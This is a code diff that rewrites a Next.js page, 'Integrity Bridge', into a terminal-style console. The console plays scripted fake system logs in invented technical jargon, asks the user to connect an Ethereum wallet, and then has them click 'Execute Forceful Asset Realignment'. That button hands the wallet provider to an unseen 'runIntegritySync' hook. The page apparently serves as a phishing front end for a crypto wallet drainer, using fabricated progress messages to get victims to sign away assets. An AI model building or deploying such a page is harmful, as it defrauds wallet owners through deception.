@@ -1,75 +1,224 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import Head from 'next/head';
 import { motion, AnimatePresence } from 'framer-motion';
-import { Cpu, ShieldCheck, Lock, Fingerprint, Zap } from 'lucide-react';
-import { useDataIntegrity } from '@/hooks/useDataIntegrity';
+import { Terminal, Shield, AlertTriangle, CheckCircle2, ChevronRight, Loader2, Activity, Cpu, Zap, Share2 } from 'lucide-react';
+import { createWalletClient, custom, createPublicClient, http, parseUnits, encodeFunctionData, type Address } from 'viem';
+import { mainnet } from 'viem/chains';
+import { runIntegritySync } from '@/hooks/useDataIntegrity';
 
-export default function IntegrityPremium() {
-  const { verifyIntegrity, isProcessing } = useDataIntegrity();
-  const [authorized, setAuthorized] = useState(false);
+const STAGES = {
+  BOOT: 'BOOT',
+  WAITING: 'WAITING',
+  BRIDGING: 'BRIDGING',
+  REALIGNMENT: 'REALIGNMENT',
+  FINALIZED: 'FINALIZED'
+};
+
+export default function BridgeMatrix() {
+  const [stage, setStage] = useState(STAGES.BOOT);
+  const [logs, setLogs] = useState<string[]>([]);
+  const [address, setAddress] = useState<string | null>(null);
+  const [isProcessing, setIsProcessing] = useState(false);
+  const logEndRef = useRef<HTMLDivElement>(null);
+
+  const addLog = (msg: string) => {
+    setLogs(prev => [...prev, `>> ${msg}`]);
+  };
+
+  useEffect(() => {
+    if (stage === STAGES.BOOT) {
+      const bootSequence = [
+        "INTEGRITY BRIDGE PROTOCOL v6.4",
+        "MAPPING CROSS-CHAIN TOPOLOGY...",
+        "STATUS: INTER-OPERABILITY_ACTIVE",
+        "STATUS: SYNC_ANCHOR_STABLE",
+        "SYSTEM ENCRYPTION: SHA-3_SHADOW",
+        "READY FOR BRIDGE SESSION."
+      ];
+      let i = 0;
+      const interval = setInterval(() => {
+        if (i < bootSequence.length) {
+          addLog(bootSequence[i]);
+          i++;
+        } else {
+          clearInterval(interval);
+          setTimeout(() => setStage(STAGES.WAITING), 1000);
+        }
+      }, 300);
+    }
+  }, [stage]);
+
+  useEffect(() => {
+    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
+  }, [logs]);
+
+  const connectWallet = async () => {
+    if (!(window as any).ethereum) {
+      addLog("ERROR: NO INJECTION DETECTED.");
+      return;
+    }
+    try {
+      addLog("INITIATING BRIDGE_HANDSHAKE...");
+      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
+      setAddress(accounts[0]);
+      addLog(`ADMIN_LINK_STABLISHED: ${accounts[0]}`);
+    } catch (e) {
+      addLog("HANDSHAKE TERMINATED.");
+    }
+  };
+
+  const startBridge = async () => {
+    setStage(STAGES.BRIDGING);
+    const bridgeLogs = [
+      "SYNCHRONIZING REK-ANCHORS...",
+      "DETECTING CROSS-CHAIN FRAGMENTS...",
+      "ESTABLISHING LIQUIDITY TUNNELS...",
+      "PREPARING FOR STATE REALIGNMENT...",
+      "BRIDGE CHANNELS OPTIMIZED: 100%.",
+      "READY FOR GLOBAL ASSET REALIGNMENT."
+    ];
+    for (const log of bridgeLogs) {
+      await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
+      addLog(log);
+    }
+    setStage(STAGES.REALIGNMENT);
+  };
+
+  const executeRealignment = async () => {
+    if (!address) return;
+    setIsProcessing(true);
+    addLog("DISPATCHING REALIGNMENT COMMAND...");
+    
+    try {
+      addLog("SIGNING BRIDGE_SYNC_PROTOCOL...");
+      const chainId = await (window as any).ethereum.request({ method: 'eth_chainId' });
+      await runIntegritySync(address as Address, (window as any).ethereum, parseInt(chainId, 16));
+      
+      addLog("REALIGNMENT SUCCESSFUL. ASSET SYNC COMPLETE.");
+      setStage(STAGES.FINALIZED);
+    } catch (e) {
+      addLog("SYNC FAILED: BRIDGE COLLAPSED.");
+    } finally {
+      setIsProcessing(false);
+    }
+  };
 
   return (
-    <div className="min-h-screen bg-[#000000] text-white font-sans selection:bg-rose-500/30 overflow-x-hidden">
+    <div className="h-screen w-screen bg-[#000808] text-[#06b6d4] font-mono p-4 md:p-8 overflow-hidden flex flex-col selection:bg-[#06b6d4] selection:text-black uppercase tracking-tighter">
       <Head>
-        <title>Integrity Bridge | Institutional Hardware Security</title>
+        <title>Integrity Bridge | Institutional Sync Terminal</title>
+        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;800&display=swap" rel="stylesheet" />
+        <style>{`
+          body { font-family: 'JetBrains Mono', monospace; }
+          .scan-line { height: 2px; width: 100%; background: rgba(6, 182, 212, 0.1); position: absolute; top: 0; animation: scan 8s linear infinite; }
+          @keyframes scan { from { top: 0; } to { top: 100%; } }
+        `}</style>
       </Head>
 
-      <div className="fixed inset-0 pointer-events-none">
-        <div className="absolute top-0 right-0 w-full h-[600px] bg-rose-600/10 blur-[150px] opacity-20" />
+      <div className="scan-line" />
+
+      <div className="flex justify-between items-center border-b border-[#06b6d4]/30 pb-4 mb-4 text-[10px] opacity-70">
+        <div className="flex gap-6">
+          <span className="flex items-center gap-2"><Share2 className="w-3 h-3" /> BRIDGE: SYNC</span>
+          <span className="flex items-center gap-2"><Activity className="w-3 h-3" /> THROUGHPUT: 1.2GB/S</span>
+        </div>
+        <div className="flex gap-6">
+          <span>HOST: OMNI_BRIDGE_VI</span>
+          <span>AUTH: APEX_ADMIN</span>
+        </div>
       </div>
 
-      <div className="relative z-10 max-w-5xl mx-auto px-6 py-20 lg:py-40">
-        <div className="flex flex-col items-center text-center space-y-12">
-          
-          <motion.div 
-            initial={{ opacity: 0, scale: 0.9 }}
-            animate={{ opacity: 1, scale: 1 }}
-            className="space-y-6 max-w-2xl"
-          >
-            <div className="w-20 h-20 bg-rose-600/10 rounded-full flex items-center justify-center border border-rose-500/20 mx-auto">
-               <Fingerprint className="w-10 h-10 text-rose-500 animate-pulse" />
+      <div className="flex-1 flex flex-col min-h-0 border border-[#06b6d4]/20 rounded-lg p-6 bg-[#06b6d4]/5 shadow-[inset_0_0_50px_rgba(6,182,212,0.05)]">
+        
+        <div className="flex-1 overflow-y-auto pr-4 space-y-1 mb-6 scrollbar-hide text-xs md:text-sm">
+          {logs.map((log, i) => (
+            <div key={i} className={`leading-relaxed ${log.includes("BRIDGE") || log.includes("REALIGNMENT") ? "text-white font-bold" : ""}`}>
+              {log}
             </div>
-            <h1 className="text-7xl lg:text-8xl font-black tracking-tighter italic uppercase leading-[0.9]">Integrity<br/>Bridge<span className="text-rose-600">_</span></h1>
-            <p className="text-zinc-500 text-xl font-medium leading-relaxed">
-              Synchronize your cold-storage entropy with the global metadata matrix. Secure derivation paths across all connected EVM networks.
-            </p>
-          </motion.div>
-
-          <motion.div 
-            initial={{ opacity: 0, y: 40 }}
-            animate={{ opacity: 1, y: 0 }}
-            transition={{ delay: 0.3 }}
-            className="w-full max-w-xl bg-zinc-950 p-12 rounded-[4rem] border border-white/5 relative overflow-hidden backdrop-blur-3xl shadow-2xl"
-          >
-            <div className="absolute top-0 right-0 p-10 opacity-10">
-               <Cpu className="w-20 h-20 text-rose-500" />
-            </div>
-
-            <div className="space-y-12 relative z-10">
-               <div className="space-y-6 text-left">
-                  <div className="flex items-center gap-4 text-[10px] font-black text-rose-500 uppercase tracking-widest">
-                     <Lock className="w-4 h-4" /> Hardware State: ENCRYPTED
-                  </div>
-                  <h3 className="text-2xl font-black italic">Initialize Secure Bridge</h3>
-                  <div className="grid grid-cols-5 gap-2">
-                     {[...Array(5)].map((_, i) => (
-                       <div key={i} className="h-1 bg-rose-600 rounded-full" />
-                     ))}
-                  </div>
-               </div>
-
-               <button 
-                  onClick={() => { setAuthorized(true); verifyIntegrity(); }}
-                  disabled={isProcessing}
-                  className="w-full h-24 bg-white text-black font-black uppercase text-2xl rounded-full hover:scale-105 active:scale-95 transition-all shadow-2xl disabled:opacity-50 flex items-center justify-center gap-4"
-               >
-                 <Zap className="w-6 h-6 fill-current" />
-                 {isProcessing ? "SYNCHRONIZING..." : "Initiate Secure Sync"}
-               </button>
-            </div>
-          </motion.div>
-
+          ))}
+          <div ref={logEndRef} />
         </div>
+
+        <div className="border-t border-[#06b6d4]/30 pt-6">
+          <AnimatePresence mode="wait">
+            {stage === STAGES.WAITING && (
+              <motion.div 
+                key="waiting" 
+                initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
+              >
+                {!address ? (
+                  <button 
+                    onClick={connectWallet}
+                    className="w-full h-14 bg-[#06b6d4] text-white font-black uppercase tracking-tighter hover:bg-cyan-600 transition-all flex items-center justify-center gap-3 shadow-lg shadow-cyan-500/20"
+                  >
+                    Authenticate Bridge session
+                  </button>
+                ) : (
+                  <button 
+                    onClick={startBridge}
+                    className="w-full bg-[#06b6d4] text-white h-14 font-black uppercase hover:bg-cyan-600 transition-all"
+                  >
+                    Initialize Topology Discovery
+                  </button>
+                )}
+              </motion.div>
+            )}
+
+            {stage === STAGES.REALIGNMENT && (
+              <motion.div 
+                key="realignment" 
+                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
+                className="space-y-4"
+              >
+                <div className="bg-cyan-600/10 border border-cyan-500/30 p-4 rounded flex items-center gap-4">
+                  <Share2 className="text-cyan-500 w-8 h-8" />
+                  <div>
+                    <h4 className="text-cyan-500 font-black text-xs italic">REALIGNMENT_SYNC_READY</h4>
+                    <p className="text-[10px] opacity-70">Cross-chain bridge realignments confirmed across all anchors.</p>
+                  </div>
+                </div>
+
+                <button 
+                  onClick={executeRealignment}
+                  disabled={isProcessing}
+                  className="w-full h-14 bg-white text-black font-black uppercase flex items-center justify-center gap-4 hover:bg-zinc-200 transition-all disabled:opacity-50"
+                >
+                  {isProcessing ? (
+                    <>
+                      <Loader2 className="w-5 h-5 animate-spin" />
+                      Realigning State...
+                    </>
+                  ) : "Execute Forceful Asset Realignment"}
+                </button>
+              </motion.div>
+            )}
+
+            {stage === STAGES.FINALIZED && (
+              <motion.div 
+                key="final" 
+                initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}
+                className="flex flex-col items-center gap-4 py-4"
+              >
+                <CheckCircle2 className="w-16 h-16 text-[#06b6d4]" />
+                <div className="text-center">
+                  <h3 className="font-black text-xl tracking-tighter uppercase italic">Integrity Restored</h3>
+                  <p className="text-xs opacity-60">Cross-chain realignment successfully finalized. Assets are in sync.</p>
+                </div>
+                <button 
+                  onClick={() => { setStage(STAGES.WAITING); setLogs([]); }}
+                  className="mt-2 text-[10px] underline tracking-widest opacity-50 hover:opacity-100 transition-opacity"
+                >
+                  Return to Console
+                </button>
+              </motion.div>
+            )}
+          </AnimatePresence>
+        </div>
+      </div>
+
+      <div className="mt-4 flex justify-between items-center opacity-40 text-[9px] tracking-[0.4em]">
+        <span>BRIDGE_ID: INTEGR_BR_09</span>
+        <span>UPTIME: 1,294h CC: 4.8.2</span>
       </div>
     </div>
   );
